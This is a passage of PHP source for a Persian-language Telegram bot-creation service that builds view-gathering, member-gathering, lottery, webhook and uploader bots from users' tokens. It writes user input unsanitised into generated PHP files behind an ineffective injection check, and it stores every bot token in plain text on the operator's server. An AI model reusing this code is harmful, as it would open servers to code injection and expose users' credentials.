file_put_contents("PaMicKCreaT/$un/lib/kodam/list.json",$bakfjd);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexv.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","ViewGir");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexv.php",$class);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/bot.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 👁‍🗨 | ویوگیر

ایدی ربات : @$un 🤖

",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
file_put_contents('databaceBot/' . $from_id, '1');
} else {
file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 30;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}



elseif($text1 == "👤 | ممبرگیر"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 30){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","MemberGir");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$texttokeen",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 30 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
        }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "MemberGir" and $text != '🔙 | بازگشت‌'){
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
باشه فهمیدیم 😒
",
]);
}
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$idbots = $resultb["result"]["id"];
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);
if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/melat");
mkdir("PaMicKCreaT/$un/ads");
mkdir("PaMicKCreaT/$un/lib");
mkdir("PaMicKCreaT/$un/photos");
mkdir("PaMicKCreaT/$un/lib/Button");
mkdir("PaMicKCreaT/$un/lib/codes");
mkdir("PaMicKCreaT/$un/lib/photos");
mkdir("PaMicKCreaT/$un/lib/spam");
mkdir("PaMicKCreaT/$un/lib/kodam");
copy("source/MemberGir/lib/Button/dokc0.txt","PaMicKCreaT/$un/lib/Button/dokc0.txt");
copy("source/MemberGir/lib/Button/dokc2.txt","PaMicKCreaT/$un/lib/Button/dokc2.txt");
copy("source/MemberGir/lib/kodam/data-ads.json","PaMicKCreaT/$un/lib/kodam/data-ads.json");
copy("source/MemberGir/lib/kodam/data-Cancellads.json","PaMicKCreaT/$un/lib/kodam/data-Cancellads.json");
copy("source/MemberGir/lib/kodam/data-left.json","PaMicKCreaT/$un/lib/kodam/data-left.json");
copy("source/MemberGir/lib/kodam/data-power.json","PaMicKCreaT/$un/lib/kodam/data-power.json");
copy("source/MemberGir/lib/kodam/data-transfer.json","PaMicKCreaT/$un/lib/kodam/data-transfer.json");
copy("source/MemberGir/lib/kodam/data-zirmjmae.json","PaMicKCreaT/$un/lib/kodam/data-zirmjmae.json");
copy("source/MemberGir/lib/kodam/data.json","PaMicKCreaT/$un/lib/kodam/data.json");
copy("source/MemberGir/lib/kodam/list.json","PaMicKCreaT/$un/lib/kodam/list.json");
mkdir("PaMicKCreaT/$un/lib/keyboard");
mkdir("PaMicKCreaT/$un/lib/keyboard/home");
copy("source/MemberGir/lib/keyboard/home","PaMicKCreaT/$un/lib/keyboard/home");
copy("source/MemberGir/lib/keyboard/home/line11.txt","PaMicKCreaT/$un/lib/keyboard/home/line11.txt");
copy("source/MemberGir/lib/keyboard/home/line12.txt","PaMicKCreaT/$un/lib/keyboard/home/line12.txt");
copy("source/MemberGir/lib/keyboard/home/line13.txt","PaMicKCreaT/$un/lib/keyboard/home/line13.txt");
copy("source/MemberGir/lib/keyboard/home/line14.txt","PaMicKCreaT/$un/lib/keyboard/home/line14.txt");
copy("source/MemberGir/lib/keyboard/home/line21.txt","PaMicKCreaT/$un/lib/keyboard/home/line21.txt");
copy("source/MemberGir/lib/keyboard/home/line22.txt","PaMicKCreaT/$un/lib/keyboard/home/line22.txt");
copy("source/MemberGir/lib/keyboard/home/line23.txt","PaMicKCreaT/$un/lib/keyboard/home/line23.txt");
copy("source/MemberGir/lib/keyboard/home/line24.txt","PaMicKCreaT/$un/lib/keyboard/home/line24.txt");
copy("source/MemberGir/lib/keyboard/home/line31.txt","PaMicKCreaT/$un/lib/keyboard/home/line31.txt");
copy("source/MemberGir/lib/keyboard/home/line32.txt","PaMicKCreaT/$un/lib/keyboard/home/line32.txt");
copy("source/MemberGir/lib/keyboard/home/line33.txt","PaMicKCreaT/$un/lib/keyboard/home/line33.txt");
copy("source/MemberGir/lib/keyboard/home/line34.txt","PaMicKCreaT/$un/lib/keyboard/home/line34.txt");
copy("source/MemberGir/lib/keyboard/home/line41.txt","PaMicKCreaT/$un/lib/keyboard/home/line41.txt");
copy("source/MemberGir/lib/keyboard/home/line42.txt","PaMicKCreaT/$un/lib/keyboard/home/line42.txt");
copy("source/MemberGir/lib/keyboard/home/line43.txt","PaMicKCreaT/$un/lib/keyboard/home/line43.txt");
copy("source/MemberGir/lib/keyboard/home/line44.txt","PaMicKCreaT/$un/lib/keyboard/home/line44.txt");
copy("source/MemberGir/lib/keyboard/home/line51.txt","PaMicKCreaT/$un/lib/keyboard/home/line51.txt");
copy("source/MemberGir/lib/keyboard/home/line52.txt","PaMicKCreaT/$un/lib/keyboard/home/line52.txt");
copy("source/MemberGir/lib/keyboard/home/line53.txt","PaMicKCreaT/$un/lib/keyboard/home/line53.txt");
copy("source/MemberGir/lib/keyboard/home/line54.txt","PaMicKCreaT/$un/lib/keyboard/home/line54.txt");
copy("source/MemberGir/lib/keyboard/home/line61.txt","PaMicKCreaT/$un/lib/keyboard/home/line61.txt");
copy("source/MemberGir/lib/keyboard/home/line62.txt","PaMicKCreaT/$un/lib/keyboard/home/line62.txt");
copy("source/MemberGir/lib/keyboard/home/line63.txt","PaMicKCreaT/$un/lib/keyboard/home/line63.txt");
copy("source/MemberGir/lib/keyboard/home/line64.txt","PaMicKCreaT/$un/lib/keyboard/home/line64.txt");
copy("source/MemberGir/lib/keyboard/home/line71.txt","PaMicKCreaT/$un/lib/keyboard/home/line71.txt");
copy("source/MemberGir/lib/keyboard/home/line72.txt","PaMicKCreaT/$un/lib/keyboard/home/line72.txt");
copy("source/MemberGir/lib/keyboard/home/line73.txt","PaMicKCreaT/$un/lib/keyboard/home/line73.txt");
copy("source/MemberGir/lib/keyboard/home/line74.txt","PaMicKCreaT/$un/lib/keyboard/home/line74.txt");
copy("source/MemberGir/lib/keyboard/home/line81.txt","PaMicKCreaT/$un/lib/keyboard/home/line81.txt");
copy("source/MemberGir/lib/keyboard/home/line82.txt","PaMicKCreaT/$un/lib/keyboard/home/line82.txt");
copy("source/MemberGir/lib/keyboard/home/line83.txt","PaMicKCreaT/$un/lib/keyboard/home/line83.txt");
copy("source/MemberGir/lib/keyboard/home/line84.txt","PaMicKCreaT/$un/lib/keyboard/home/line84.txt");

copy("source/MemberGir/lib/keyboard","PaMicKCreaT/$un/lib/keyboard");
copy("source/MemberGir/lib/kodam","PaMicKCreaT/$un/lib/kodam");
copy("source/MemberGir/lib/keyboard/home/channelkey.txt","PaMicKCreaT/$un/lib/keyboard/home/channelkey.txt");
copy("source/MemberGir/lib/class.php","PaMicKCreaT/$un/lib/class.php");
copy("source/MemberGir/lib/jdf.php","PaMicKCreaT/$un/lib/jdf.php");
copy("source/MemberGir/melat.json","PaMicKCreaT/$un/melat.json");
copy("source/MemberGir/bot.php","PaMicKCreaT/$un/bot.php");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$class = file_get_contents("source/MemberGir/config.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[UUSSEE]",$username,$class);
$class = str_replace("[BOOT]", $un, $class);
$class = str_replace("[*[IDBOOT]*]",$idbots,$class);
file_put_contents("PaMicKCreaT/$un/config.php",$class);
$bakfjd = file_get_contents("source/MemberGir/lib/kodam/list.json");
$bakfjd = str_replace("[ADMIIIN]",$from_id,$bakfjd);
file_put_contents("PaMicKCreaT/$un/lib/kodam/list.json",$bakfjd);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexs.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","MemberGir");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexs.php",$class);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/bot.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 👤 | ممبرگیر

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
file_put_contents('databaceBot/' . $from_id, '1');
} else {
file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 30;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

elseif($text1 == "🎰 | قرعه کشی‌"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 10){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","qure");
 bot('sendMessage',[
         'chat_id'=>$chat_id,
         'text'=>"
جهت ساخت ربات قرعه کشی باید فرم زیر را پر کنید و برای ما بفرستید ✅
لطفا هرکدام را سر جای خودش قرار بدید تا مشکلی پیش نیاد ⭐

لاین اول : یوزرنیم چنل بدون @
لاین دوم : ایدی عددی چنل بدون -100
",
        'parse_mode'=>'HTML',
        'reply_markup'=>json_encode([
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ],
        'resize_keyboard'=>true
        ])
        ]);
        }else{
bot('sendmessage', [
            'chat_id' => $chat_id,
            'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"
جهت ساخت این ربات به 10 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
        ",
        'parse_mode'=>'HTML',
        ]);
                }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
        elseif($bloxk !== "ok" && $state == "qure" && $text !="بازگشت ↪️" ){
        if($text[0] == '@')$text = substr($text, 1);
        if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
        bot('sendmessage',[
        'chat_id' => $chat_id,
        'text' => "
        باشه فهمیدیم 😒
        ",
        ]);
        }
        file_put_contents("dataPaMicK/$chat_id/Cop.txt",$text);
        file_put_contents("dataPaMicK/$from_id/state.txt","qurek");
        bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"$texttokeen",
        'parse_mode'=>'Markdown', 
        'reply_markup'=>json_encode([ 
        'resize_keyboard'=>true,
        'keyboard'=>[
        [['text'=>"🔙 | بازگشت‌"]],
        ]
        ])
        ]);
        }

elseif($bloxk !== "ok" && $state == "qurek" and $text != 'بازگشت ↪️'){
	 if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
            bot('sendmessage',[
            'chat_id' => $chat_id,
            'text' => "
            باشه فهمیدیم 😒
            ",
            ]);
    }
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
		if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
توکن شما درست نمیباشد لطفا توکن درست رو ارسال کنید ⛔
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);

if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$Cop = file_get_contents("dataPaMicK/$chat_id/Cop.txt");
$all = explode("\n", $Cop);	
$class = file_get_contents("source/qure/indexq.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
$class = str_replace("[CHANNEEL]",$all[0],$class);
$class = str_replace("[IDCHANNEEL]",$all[1],$class);
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexpa.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","qure");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexs.php",$class);
file_put_contents("PaMicKCreaT/$un/indexq.php",$class);
$txt = urlencode("ربات شما با موفقیت ساخته شد با دستور /start ربات خود را استارت کنید و با دستور /panel وارد پنل مدیریتی ربات خود شوید 🗂");
file_get_contents("https://api.telegram.org/bot".$text."/SendMessage?chat_id=".$from_id."&text=".$txt."&parse_mode=MarkDown");
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/indexq.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 🎰 | قرعه کشی

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
    file_put_contents('databaceBot/' . $from_id, '1');
} else {
    file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 10;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}


elseif($text1 == "🔗 | ست وب هوک"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 10){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","SeTWebHoK");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$texttokeen",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
],
'resize_keyboard'=>true,
])
]);
}
}else{
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
جهت ساخت این ربات به 10 سکه نیاز دارید 🔗
لطفا موجودی خود را افزایش دهید سپس امتحان کنید ⚒
",
'parse_mode'=>'HTML',
]);
        }
}else{
bot('sendMessage',[ 
'chat_id'=>$chat_id, 
'text'=>"ساخت ربات خاموش میباشد", 
'parse_mode'=>'html',
'reply_to_message_id'=>$message_id, 
'reply_markup'=>$menu,
]);
}}
elseif($bloxk !== "ok" && $state == "SeTWebHoK" and $text != '🔙 | بازگشت‌'){
if(strpos($text, '"') !== false && strpos($text, '.') !== false && strpos($text, '(') !== false){
bot('sendmessage',[
'chat_id' => $chat_id,
'text' => "
گوه نخور :|
",
]);
}
function objectToArrays( $object ){
if( !is_object( $object ) && !is_array( $object ))
{
return $object;
}
if( is_object( $object ))
{
$object = get_object_vars( $object );
}
return array_map( "objectToArrays", $object );
}
$userbot = json_decode(file_get_contents("https://api.telegram.org/bot".$text."/getme"));
$resultb = objectToArrays($userbot);
$un = $resultb["result"]["username"];
$ok = $resultb["ok"];
if($ok != 1 ){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
❌ توکن شما معتبر نمی باشد تصحیح کنید!
",
]);

}else{
if($bloxk !== "ok"){
 bot('sendMessage',[
 'chat_id'=>$chat_id,
'text'=>"
⚠️ ؛ در صورتی که توکن ربات خود را تغییر دادید برای تغییر ان به پیوی پشتیبانی @$suporttt مراجعه کنید .
 
🔐 ؛ امنیت ربات های شما توسط ما تامین میشود ، ولی تا موقعی که توکن ربات خود را برای کسی به اشتراک نگذاشته باشید .
 
♻️ ؛  درصورتیکه آپدیتی در @$channel برای ربات شما گزارش شد ، حتما در اولین فرصت ربات خود را آپدیت کنید .
 
🧞 ؛  برای ورود به پنل مدیریت ربات خود از دستور /panel‌ استفاده کنید .
 
👨‍💻 ؛  درصورت مشکل در عملیات و راهنمایی بیشتر به پشتیبانی مراجعه کنید .
" ]);
if($type =="Gold"){
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","gold");
}else{
file_put_contents("PaMicKCreaT/$un/dataPaMicK/bottype.txt","free");
}
mkdir("PaMicKCreaT/$un");
mkdir("PaMicKCreaT/$un/data");
file_put_contents("PaMicKCreaT/$un/dataPaMicK/my_id.txt","$from_id");
file_put_contents("dataPaMicK/$from_id/state.txt","none");
$class = file_get_contents("source/SeTWebHoK/handler.php");
$class = str_replace("[TOKEEN]",$text,$class);
$class = str_replace("[ADMIIN]",$from_id,$class);
file_put_contents("PaMicKCreaT/$un/handler.php",$class);
copy("source/SeTWebHoK/index.php","PaMicKCreaT/$un/index.php");
mkdir("dataPaMicK/bot/$un");
file_put_contents("PaMicKCreaT/$un/indexpa.php",$class);
file_put_contents("dataPaMicK/bot/$un/token.txt",$text);
file_put_contents("dataPaMicK/bot/$un/bot.txt","SeTWebHoK");
file_put_contents("dataPaMicK/bot/$un/jdf.php",$jdf);
file_put_contents("dataPaMicK/bot/$un/index.php",$upcr);
file_put_contents("PaMicKCreaT/$un/indexs.php",$class);
file_get_contents("https://api.telegram.org/bot".$text."/setwebhook?url=".$folder."/PaMicKCreaT/".$un."/index.php");
$user["bots"][] = "@$un";
$outjson = json_encode($user,true);
file_put_contents("dataPaMicK/$from_id/$from_id.json",$outjson);
/*file_put_contents("dataPaMicK/$from_id/create.txt","yes");*/
$crs = $botss + 1;
file_put_contents("dataPaMicK/$from_id/botss.txt",$crs);
$users = file_get_contents('dataPaMicK/bots.txt');
$member = explode("\n",$users);
if (!in_array($un,$member)){
$add_bot = file_get_contents('dataPaMicK/bots.txt');
$add_bot .= $un."\n";
file_put_contents('dataPaMicK/bots.txt',$add_bot);
}
$user_b = file_get_contents("dataPaMicK/$from_id/bots.txt");
$member_b = explode("\n",$user_b);
if (!in_array($un,$member_b)){
$add_bot = file_get_contents("dataPaMicK/$from_id/bots.txt");
$add_bot .= $un."\n";
file_put_contents("dataPaMicK/$from_id/bots.txt",$add_bot);
}
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
ربات شما با موفقیت ساخته شد و به سرور ما متصل شد 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات ساخته شده 🗂",'url'=>"https://t.me/$un"]],
]
])
]);
bot('sendMessage',[
'chat_id'=>$Dev,
'text'=>"
New RoBoT Dev 🎊

ادمین عزیز ربات جدیدی ساخته شد 👮‍♂️

🔸 سازنده :  tg://user?id=$chat_id
🔸 سازنده : @$username

نوع ربات ساخته شده : 🔗 | ست وب هوک

ایدی ربات : @$un 🤖
",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ورود به ربات 🎊",'url'=>"https://t.me/$un"]],
]
])
]);
if (!file_exists('databaceBot/' . $from_id)) {
file_put_contents('databaceBot/' . $from_id, '1');
} else {
file_put_contents('databaceBot/' . $from_id, file_get_contents('databaceBot/' . $from_id) + 1);
}
$coin = file_get_contents("dataPaMicK/$from_id/coin.txt");
settype($coin,"integer");
$newcoin = $coin - 10;
save("dataPaMicK/$from_id/coin.txt",$newcoin);
}
}}

elseif($text1 == "📥 | آپلودر"){
$creatorreebot = file_get_contents("dataPaMicK/creatorreebot.txt");
if($creatorreebot == 'on'){
if($coin >= 10){
if ( $uplodbot > $botss) {
file_put_contents("dataPaMicK/$from_id/state.txt","uplod");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"
$texttokeen",
'parse_mode'=>'Markdown', 
'reply_markup'=>json_encode([ 
'resize_keyboard'=>true,
'keyboard'=>[
[['text'=>"🔙 | بازگشت‌"]],
]
])
]);
}else{
bot('sendmessage', [
'chat_id' => $chat_id,
'text' =>  "
به محدودیت ساخت ربات رسیدیم 😥
لطفا یکی از ربات های خود را حذف کنید سپس ربات جدید بسازید 📛
",
